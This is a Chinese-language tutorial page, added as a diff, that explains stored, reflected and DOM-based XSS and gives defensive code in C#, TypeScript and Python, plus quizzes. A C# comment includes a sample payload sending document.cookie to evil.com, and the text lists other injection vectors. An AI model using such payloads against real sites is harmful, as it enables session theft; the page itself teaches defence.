@@ -1,0 +1,237 @@
+---
+title: "XSS 跨站腳本攻擊"
+order: 3
+description: "Stored、Reflected、DOM-based XSS 的攻擊原理與防禦實務"
+difficulty: "medium"
+interviewImportance: 5
+related:
+  - "security/owasp-top-10"
+  - "security/csrf-and-cors"
+---
+
+# XSS 跨站腳本攻擊（Cross-Site Scripting）
+
+<ELI5>
+想像你在一個留言板上留言，其他人都看得到：
+
+- 正常人留言：「這個產品很棒！」→ 大家看到一行文字
+- 壞人留言：「`<script>`偷走你的帳號密碼`</script>`」→ 如果網站沒有防護，這段程式碼會在**每個看到這則留言的人**的瀏覽器中執行
+
+XSS 就是攻擊者把**惡意 JavaScript**偷偷塞進網頁中，在其他使用者的瀏覽器裡執行。
+</ELI5>
+
+## 是什麼？
+
+XSS（Cross-Site Scripting）是攻擊者將惡意 JavaScript 程式碼注入到網頁中，在其他使用者的瀏覽器中執行。可以竊取 Cookie / Token、冒充使用者操作、竄改頁面內容、導向釣魚網站。
+
+<Callout type="info" title="為什麼叫 XSS 不叫 CSS">
+為了避免和 CSS（Cascading Style Sheets）混淆，所以用 XSS 作為縮寫。XSS 在 OWASP Top 10:2021 中被歸入 A03: Injection 類別。
+</Callout>
+
+## 核心觀念
+
+- **Stored XSS（儲存型）**：惡意腳本被存到伺服器（如資料庫中的留言），所有讀取該資料的使用者都會受害。危害最大，因為是持久的
+- **Reflected XSS（反射型）**：惡意腳本在 URL 參數中，伺服器將其「反射」回頁面。攻擊者需要誘騙使用者點擊特製連結
+- **DOM-based XSS**：惡意腳本完全在前端（瀏覽器）中執行，不經過伺服器。前端 JavaScript 直接讀取使用者輸入並插入 DOM
+- **Output Encoding（輸出編碼）**：在輸出使用者提供的內容時，將特殊字元轉換為 HTML Entities（如 `<` 變成 `&lt;`），讓瀏覽器把它們當文字而非程式碼
+- **CSP（Content Security Policy）**：HTTP Header 告訴瀏覽器只允許從特定來源載入腳本，阻止未授權的 inline script 執行
+
+## 常見誤區
+
+<Callout type="warning" title="常見誤區">
+- **只過濾 `<script>` 標籤**：XSS 不只靠 `<script>`，還可以用 `<img onerror="...">`、`<svg onload="...">`、`<a href="javascript:...">`  等方式執行。黑名單過濾永遠不夠完整
+- **前端框架就不會有 XSS**：React、Vue、Angular 預設做 HTML Escape，但使用 `dangerouslySetInnerHTML`（React）或 `v-html`（Vue）時就繞過了防護
+- **HttpOnly Cookie 就完全安全了**：HttpOnly 防止 JavaScript 讀取 Cookie，但 XSS 仍然可以冒充使用者發送請求（因為瀏覽器會自動帶上 Cookie）
+</Callout>
+
+## 流程/步驟
+
+<StepDiagram data='[{"title":"輸入驗證","description":"在伺服器端驗證所有輸入的格式和長度","icon":"1"},{"title":"Output Encoding","description":"輸出到 HTML/JS/URL 時做對應的編碼","icon":"2"},{"title":"設定 CSP Header","description":"限制腳本來源，禁止 inline script","icon":"3"},{"title":"使用框架的安全特性","description":"React JSX、Vue template 預設做 HTML Escape","icon":"4"},{"title":"設定 Cookie 屬性","description":"HttpOnly + Secure + SameSite 保護 Cookie","icon":"5"},{"title":"定期掃描","description":"用 DAST 工具自動測試 XSS 漏洞","icon":"6"}]' />
+
+流程解讀：XSS 防禦是多層的。輸入驗證是第一層，Output Encoding 是最關鍵的一層（在輸出時處理），CSP Header 是額外的安全網。使用現代前端框架的預設安全特性，避免使用繞過防護的 API。
+
+## 程式碼範例
+
+### C# 版本
+
+```csharp
+// Stored XSS 攻擊場景
+// 攻擊者在留言中輸入: <script>document.location='https://evil.com/steal?c='+document.cookie</script>
+// 如果直接輸出，所有看到這則留言的人的 Cookie 都會被偷
+
+// 防禦 1: ASP.NET Core Razor — 預設做 HTML Encoding
+// @Model.Comment ← 預設安全，自動轉義
+// @Html.Raw(Model.Comment) ← 危險！跳過轉義
+
+// 防禦 2: 手動 HTML Encode
+using System.Web;
+
+public string SanitizeOutput(string input)
+    => HttpUtility.HtmlEncode(input);
+// "<script>alert(1)</script>" → "&lt;script&gt;alert(1)&lt;/script&gt;"
+
+// 防禦 3: CSP Header
+app.Use(async (context, next) =>
+{
+    context.Response.Headers.Append(
+        "Content-Security-Policy",
+        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;"
+    );
+    await next();
+});
+
+// 防禦 4: Cookie 安全屬性
+builder.Services.AddAuthentication().AddCookie(options =>
+{
+    options.Cookie.HttpOnly = true;    // JS 不能讀取
+    options.Cookie.SecurePolicy = CookieSecurePolicy.Always; // 只走 HTTPS
+    options.Cookie.SameSite = SameSiteMode.Strict; // 不隨跨站請求發送
+});
+```
+
+### TypeScript 版本
+
+```typescript
+// React — 預設安全
+function Comment({ text }: { text: string }) {
+  // 安全：React JSX 預設做 HTML Escape
+  return <p>{text}</p>;
+  // "<script>alert(1)</script>" 會顯示為文字，不會執行
+}
+
+// 危險！繞過 React 的保護
+function UnsafeComment({ html }: { html: string }) {
+  // 永遠不要用 dangerouslySetInnerHTML 處理使用者輸入
+  return <div dangerouslySetInnerHTML={{ __html: html }} />;
+}
+
+// 如果必須允許部分 HTML（如富文本編輯器），用 DOMPurify 消毒
+import DOMPurify from "dompurify";
+
+function SafeRichContent({ html }: { html: string }) {
+  const clean = DOMPurify.sanitize(html, {
+    ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "br"],
+    ALLOWED_ATTR: ["href"],
+  });
+  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
+}
+
+// DOM-based XSS 防禦
+// 危險！
+// document.getElementById("output").innerHTML = location.hash.slice(1);
+
+// 正確！用 textContent 而非 innerHTML
+document.getElementById("output")!.textContent = location.hash.slice(1);
+
+// Express.js — CSP + 安全 Headers
+import helmet from "helmet";
+app.use(
+  helmet({
+    contentSecurityPolicy: {
+      directives: {
+        defaultSrc: ["'self'"],
+        scriptSrc: ["'self'"],
+        styleSrc: ["'self'", "'unsafe-inline'"],
+        imgSrc: ["'self'", "data:"],
+      },
+    },
+  })
+);
+```
+
+### Python 版本
+
+```python
+# Jinja2 — 預設做 HTML Escape
+from markupsafe import escape
+
+# 安全：Jinja2 模板預設轉義
+# {{ user_comment }} ← 自動轉義
+# {{ user_comment|safe }} ← 危險！跳過轉義
+
+# 手動轉義
+safe_output = escape("<script>alert(1)</script>")
+# 結果: "&lt;script&gt;alert(1)&lt;/script&gt;"
+
+# FastAPI — CSP Header
+from fastapi import FastAPI
+from fastapi.middleware.trustedhost import TrustedHostMiddleware
+
+app = FastAPI()
+
+@app.middleware("http")
+async def add_security_headers(request, call_next):
+    response = await call_next(request)
+    response.headers["Content-Security-Policy"] = (
+        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
+    )
+    response.headers["X-Content-Type-Options"] = "nosniff"
+    response.headers["X-Frame-Options"] = "DENY"
+    return response
+
+# 如果需要允許部分 HTML，用 bleach 消毒
+import bleach
+
+def sanitize_html(html: str) -> str:
+    return bleach.clean(
+        html,
+        tags=["b", "i", "em", "strong", "a", "p", "br"],
+        attributes={"a": ["href"]},
+        strip=True,
+    )
+
+# 驗證 URL（防止 javascript: 協議的 XSS）
+from urllib.parse import urlparse
+
+def is_safe_url(url: str) -> bool:
+    parsed = urlparse(url)
+    return parsed.scheme in ("http", "https", "")
+```
+
+## 架構圖/概念圖
+
+<Diagram data='{"nodes":[{"id":"attacker","label":"Attacker","type":"muted"},{"id":"stored","label":"Stored XSS (in DB)","type":"highlight"},{"id":"reflected","label":"Reflected XSS (in URL)","type":"default"},{"id":"dom","label":"DOM XSS (in Browser)","type":"default"},{"id":"victim","label":"Victim Browser","type":"muted"},{"id":"steal","label":"Stolen Cookie / Session","type":"muted"}],"edges":[{"from":"attacker","to":"stored","label":"posts malicious comment"},{"from":"attacker","to":"reflected","label":"crafts malicious URL"},{"from":"stored","to":"victim","label":"executes on page load"},{"from":"reflected","to":"victim","label":"executes on click"},{"from":"dom","to":"victim","label":"executes via JS"},{"from":"victim","to":"steal","label":"sends to attacker"}]}' />
+
+三種 XSS 的攻擊路徑不同但結果相同：惡意 JavaScript 在受害者的瀏覽器中執行。Stored XSS 危害最大（持久、被動觸發）、Reflected XSS 需要使用者點擊連結、DOM XSS 完全在前端發生。
+
+## 實戰補充
+
+**Q: 面試怎麼解釋三種 XSS 的差別？**
+
+A: 用一句話區分：**Stored**（惡意腳本存在伺服器，任何人看到都會中招）、**Reflected**（惡意腳本藏在 URL，要點連結才中招）、**DOM-based**（惡意腳本完全在前端處理，不經過伺服器）。Stored 危害最大因為是持久的且被動觸發。
+
+**Q: CSP 怎麼設定？**
+
+A: 從嚴格的策略開始：`default-src 'self'`（只允許自己網域的資源）。按需開放：`script-src 'self'`（腳本只來自自己）、`img-src 'self' data:`（圖片允許 data URI）。永遠不要設 `unsafe-eval`，盡量避免 `unsafe-inline`。
+
+**Q: 富文本編輯器（如 CKEditor）怎麼防 XSS？**
+
+A: 在伺服器端用白名單消毒（Sanitize）— 只允許安全的 HTML 標籤（`<b>`, `<i>`, `<a>`）和屬性（`href`）。C# 用 HtmlSanitizer、JavaScript 用 DOMPurify、Python 用 bleach。永遠不要信任前端編輯器的輸出。
+
+## 理解測驗
+
+<Quiz data='{"question":"三種 XSS 中，哪種危害最大？為什麼？","options":["Reflected XSS，因為最常見","DOM-based XSS，因為最難偵測","Stored XSS，因為惡意腳本持久存在，所有讀取該頁面的使用者都會受害","三種一樣危險"],"answer":2,"explanation":"Stored XSS 的惡意腳本存在伺服器（如資料庫），只要有人瀏覽含有該內容的頁面就會觸發，不需要使用者點擊特殊連結。影響範圍最廣。"}' />
+
+<Quiz data='{"question":"React 的 JSX 預設如何防禦 XSS？","options":["用 CSP Header","對所有插值表達式做 HTML Escape，特殊字元變成 HTML Entities","用 Web Application Firewall","自動刪除使用者輸入中的 HTML 標籤"],"answer":1,"explanation":"React JSX 的 {} 插值表達式預設做 HTML Escape，把 < 變成 &lt;、> 變成 &gt;，讓瀏覽器把它們當文字顯示而非 HTML 標籤。"}' />
+
+<Quiz data='{"question":"CSP（Content Security Policy）如何防禦 XSS？","options":["加密所有傳輸","限制瀏覽器只能從指定來源載入和執行腳本","阻止所有 JavaScript 執行","隱藏 HTML 原始碼"],"answer":1,"explanation":"CSP 透過 HTTP Header 告訴瀏覽器只能從哪些來源載入腳本。即使攻擊者成功注入了 inline script，如果 CSP 禁止 inline script 執行，攻擊就無效。"}' />
+
+## 重點整理
+
+<Callout type="tip" title="一句話記住">
+**XSS 防禦 = 輸出時做 Encoding + CSP 限制腳本來源 + 不信任使用者輸入。** 口訣：「輸出必轉義，CSP 必設定」
+</Callout>
+
+| XSS 類型 | 攻擊方式 | 觸發條件 | 持久性 |
+|----------|---------|---------|--------|
+| **Stored** | 惡意腳本存在伺服器 | 瀏覽頁面就觸發 | 持久 |
+| **Reflected** | 惡意腳本在 URL 中 | 點擊連結才觸發 | 非持久 |
+| **DOM-based** | 前端 JS 處理不安全輸入 | 前端操作觸發 | 非持久 |
+
+| 防禦層級 | 措施 |
+|---------|------|
+| **最關鍵** | Output Encoding（輸出時轉義） |
+| **框架層** | React JSX / Vue template 預設安全 |
+| **HTTP 層** | CSP Header 限制腳本來源 |
+| **Cookie 層** | HttpOnly + Secure + SameSite |
+| **需要富文本時** | DOMPurify / bleach 白名單消毒 |
